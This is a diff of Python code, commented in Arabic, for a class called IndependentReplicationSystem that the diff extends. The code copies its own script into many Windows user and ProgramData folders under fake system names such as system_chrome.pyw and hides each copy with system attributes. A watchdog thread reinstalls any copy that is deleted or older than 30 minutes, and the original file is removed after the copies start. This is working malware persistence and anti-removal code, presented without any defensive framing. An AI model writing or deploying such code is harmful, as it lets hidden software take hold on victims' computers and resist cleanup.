@@ -1374,20 +1374,34 @@ class IndependentReplicationSystem:
         self.all_copies_started = False
         
     def get_system_locations(self):
-        """مواقع نظامية متعددة للنسخ"""
-        return [
-            os.path.join(os.getenv('TEMP'), "windows_system_service.pyw"),
-            os.path.join(os.getenv('WINDIR'), 'System32', 'drivers', 'etc', 'hosts_backup.pyw'),
-            os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows', 'system_cache.pyw'),
-            os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'system_services.pyw'),
-            os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Microsoft', 'Windows', 'system_main.pyw')
+        """مواقع ذكية للنسخ بدون صلاحيات مدير"""
+        locations = []
+        
+        # 1. مجلدات المستخدم (لا تحتاج صلاحيات)
+        user_locations = [
+            os.path.join(os.getenv('TEMP'), "system_audio.pyw"),
+            os.path.join(os.getenv('APPDATA'), "Microsoft", "Windows", "system_services.pyw"),
+            os.path.join(os.getenv('LOCALAPPDATA'), "Microsoft", "Windows", "system_cache.pyw"),
+            os.path.join(os.getenv('USERPROFILE'), "Documents", "system_docs.pyw"),
+            os.path.join(os.getenv('USERPROFILE'), "Downloads", "system_downloads.pyw"),
         ]
-    
+        
+        # 2. مجلدات برامج (يمكن الوصول بدون صلاحيات)
+        program_locations = [
+            os.path.join(os.getenv('PROGRAMDATA'), "Microsoft", "Windows", "system_update.pyw"),
+            os.path.join(os.getenv('PROGRAMDATA'), "Adobe", "system_adobe.pyw"),
+            os.path.join(os.getenv('PROGRAMDATA'), "Google", "system_chrome.pyw"),
+        ]
+        
+        locations.extend(user_locations)
+        locations.extend(program_locations)
+        
+        return locations
     def create_multiple_copies(self):
-        """إنشاء نسخ متعددة في مواقع مختلفة"""
+        """إنشاء نسخ متعددة مع استبدال الملفات القديمة"""
         created_copies = []
         
-        print("🔍 فحص الملفات الحالية...")
+        print("🔍 فحص واستبدال الملفات...")
         for location in self.system_locations:
             if os.path.exists(location):
                 print(f"   ✅ موجود: {os.path.basename(location)}")
@@ -1399,23 +1413,25 @@ class IndependentReplicationSystem:
                 # إنشاء المجلد إذا لم يكن موجوداً
                 os.makedirs(os.path.dirname(location), exist_ok=True)
                 
-                # التحقق إذا كان الملف موجوداً بالفعل
-                if not os.path.exists(location):
-                    # نسخ الملف
-                    shutil.copy2(self.original_path, location)
-                    
-                    # إخفاء الملف
-                    subprocess.run(f'attrib +h +s "{location}"', shell=True, capture_output=True)
-                    
-                    created_copies.append(location)
-                    # تشغيل النسخة مباشرة بعد إنشائها
-                    self.start_copy(location)
-                    print(f"✅ إنشاء: {os.path.basename(location)}")
-                else:
-                    print(f"⚠️  موجود مسبقاً: {os.path.basename(location)}")
-                    created_copies.append(location)
-                    # تشغيل النسخة الموجودة مسبقاً
-                    self.start_copy(location)
+                # 🔄 الاستبدال: إذا الملف موجود، احذفه أولاً
+                if os.path.exists(location):
+                    try:
+                        os.remove(location)
+                        print(f"🔄 استبدال: {os.path.basename(location)}")
+                    except Exception as e:
+                        print(f"⚠️ لا يمكن حذف الملف القديم: {e}")
+                        continue
+                
+                # نسخ الملف الجديد (دائماً ننشئ نسخة جديدة)
+                shutil.copy2(self.original_path, location)
+                
+                # إخفاء الملف
+                subprocess.run(f'attrib +h +s "{location}"', shell=True, capture_output=True)
+                
+                created_copies.append(location)
+                # تشغيل النسخة مباشرة بعد إنشائها
+                self.start_copy(location)
+                print(f"✅ إنشاء: {os.path.basename(location)}")
                 
             except Exception as e:
                 print(f"❌ فشل نسخ {location}: {e}")
@@ -1597,7 +1613,7 @@ class IndependentReplicationSystem:
             return 0
     
     def start_intelligent_protection(self):
-        """بدء حماية ذكية للنسخ"""
+        """بدء حماية ذكية متقدمة مع تجديد الملفات"""
         def protection_worker():
             # انتظر قليلاً في البداية
             time.sleep(3)
@@ -1610,42 +1626,57 @@ class IndependentReplicationSystem:
                     # استخدام Lock لمنع التكرار
                     with self.creation_lock:
                         missing_files = []
-                        existing_files = []
+                        outdated_files = []
+                        healthy_files = []
                         
                         # فحص جميع المواقع
                         for location in self.system_locations:
-                            if os.path.exists(location):
-                                existing_files.append(os.path.basename(location))
-                            else:
+                            if not os.path.exists(location):
                                 missing_files.append(os.path.basename(location))
+                            else:
+                                # التحقق من تاريخ التعديل (إذا أقدم من 30 دقيقة)
+                                stat = os.stat(location)
+                                if time.time() - stat.st_mtime > 1800:  # 30 دقيقة
+                                    outdated_files.append(os.path.basename(location))
+                                else:
+                                    healthy_files.append(os.path.basename(location))
                         
-                        # طباعة تقرير كل 10 دورات فقط
-                        if protection_cycle % 10 == 0:
+                        # طباعة تقرير كل 5 دورات فقط
+                        if protection_cycle % 5 == 0:
                             print(f"📊 تقرير الحماية - الدورة #{protection_cycle}")
-                            print(f"   ✅ الملفات النشطة: {len(existing_files)}")
+                            print(f"   ✅ الملفات السليمة: {len(healthy_files)}")
+                            print(f"   🔄 الملفات القديمة: {len(outdated_files)}")
                             if missing_files:
                                 print(f"   ❌ الملفات المفقودة: {missing_files}")
                         
-                        # إعادة إنشاء الملفات المفقودة
-                        if missing_files:
-                            print(f"🔄 اكتشاف {len(missing_files)} ملف مفقود: {missing_files}")
+                        # إعادة إنشاء الملفات المفقودة والقديمة
+                        files_to_recreate = missing_files + outdated_files
+                        if files_to_recreate:
+                            print(f"🔄 اكتشاف {len(files_to_recreate)} ملف يحتاج تجديد: {files_to_recreate}")
                             
                             for location in self.system_locations:
-                                if not os.path.exists(location):
+                                basename = os.path.basename(location)
+                                if basename in files_to_recreate:
                                     try:
-                                        print(f"   🔨 جاري إنشاء: {os.path.basename(location)}")
+                                        print(f"   🔨 جاري تجديد: {basename}")
+                                        
+                                        # حذف الملف القديم إذا كان موجوداً
+                                        if os.path.exists(location):
+                                            os.remove(location)
+                                        
+                                        # إنشاء نسخة جديدة
                                         shutil.copy2(self.original_path, location)
                                         subprocess.run(f'attrib +h +s "{location}"', shell=True, capture_output=True)
-                                        print(f"   ✅ تم إنشاء: {os.path.basename(location)}")
+                                        print(f"   ✅ تم تجديد: {basename}")
                                         
                                         # انتظر بين كل إنشاء
                                         time.sleep(1)
                                         
                                     except Exception as e:
-                                        print(f"   ❌ فشل إنشاء {os.path.basename(location)}: {e}")
+                                        print(f"   ❌ فشل تجديد {basename}: {e}")
                     
-                    # فاصل أطول بين الدورات
-                    time.sleep(5)  # 15 ثانية بدلاً من 5
+                    # فاصل بين الدورات
+                    time.sleep(5)  # فحص كل 10 ثواني
                     
                 except Exception as e:
                     print(f"⚠️ خطأ في الحماية: {e}")
@@ -1654,8 +1685,7 @@ class IndependentReplicationSystem:
         # تشغيل خيط حماية واحد فقط بدلاً من 3
         thread = threading.Thread(target=protection_worker, daemon=True)
         thread.start()
-        print("🛡️ بدء نظام الحماية الذكية (خيط واحد)")
-    
+        print("🛡️ بدء نظام الحماية الذكية المتقدم")  
     def install_complete_independent_system(self):
         """تثبيت النظام المستقل الكامل"""
         print("=" * 50)
@@ -1697,31 +1727,58 @@ class IndependentReplicationSystem:
         return total
 
     def delete_original_and_switch(self):
-        """حذف الملف الأصلي والتبديل للنسخ الاحتياطية"""
+        """حذف آمن للملف الأصلي مع التأكد من عمل النسخ"""
         try:
-            if os.path.exists(self.original_path):
-                print("🗑️ جاري حذف الملف الأصلي والتبديل للنسخ الاحتياطية...")
-                
-                # تشغيل نسخة احتياطية أولاً
-                if self.backup_copies:
-                    backup_path = self.backup_copies[0]
-                    if os.path.exists(backup_path):
-                        python_exe = sys.executable
-                        subprocess.Popen([python_exe, backup_path], 
-                                       stdout=subprocess.DEVNULL,
-                                       stderr=subprocess.DEVNULL,
-                                       stdin=subprocess.DEVNULL,
-                                       creationflags=subprocess.CREATE_NO_WINDOW)
-                        print("🚀 تم تشغيل النسخة الاحتياطية")
-                
-                # ثم حذف الملف الأصلي
-                time.sleep(2)
-                os.remove(self.original_path)
-                print("✅ تم حذف الملف الأصلي")
-                
+            if not os.path.exists(self.original_path):
+                print("ℹ️ الملف الأصلي غير موجود بالفعل")
                 return True
+            
+            print("🔍 التحقق من النسخ الاحتياطية قبل الحذف...")
+            
+            # التحقق من وجود نسخ احتياطية نشطة
+            active_copies = []
+            for location in self.backup_copies:
+                if os.path.exists(location):
+                    active_copies.append(location)
+            
+            print(f"📊 النسخ النشطة: {len(active_copies)} من أصل {len(self.backup_copies)}")
+            
+            if len(active_copies) >= 2:  # على الأقل نسختين
+                print("🔄 تشغيل النسخ الاحتياطية للتأكد...")
+                
+                # تشغيل جميع النسخ النشطة
+                started_count = 0
+                for copy_path in active_copies:
+                    if self.start_copy(copy_path):
+                        started_count += 1
+                        time.sleep(0.5)  # انتظر نصف ثانية بين كل تشغيل
+                
+                print(f"🚀 تم تشغيل {started_count} نسخة احتياطية")
+                
+                if started_count >= 2:
+                    print("⏳ انتظر 3 ثوانٍ للتأكد من التشغيل...")
+                    time.sleep(3)
+                    
+                    print("🗑️ جاري حذف الملف الأصلي...")
+                    os.remove(self.original_path)
+                    
+                    # التحقق النهائي من الحذف
+                    if not os.path.exists(self.original_path):
+                        print("✅ تم حذف الملف الأصلي بنجاح!")
+                        print("🎯 النظام الآن يعمل من النسخ الاحتياطية فقط")
+                        return True
+                    else:
+                        print("⚠️ لم يتم حذف الملف الأصلي (مشكلة في الصلاحيات)")
+                        return False
+                else:
+                    print("❌ لم يتم تشغيل نسخ كافية، إلغاء الحذف")
+                    return False
+            else:
+                print("❌ لا توجد نسخ احتياطية كافية، إلغاء الحذف")
+                return False
+                
         except Exception as e:
-            print(f"⚠️ لم يتم حذف الملف الأصلي: {e}")
+            print(f"❌ خطأ في حذف الملف الأصلي: {e}")
             return False
 
 # === النظام اللانهائي مع النسخ المستقل ===
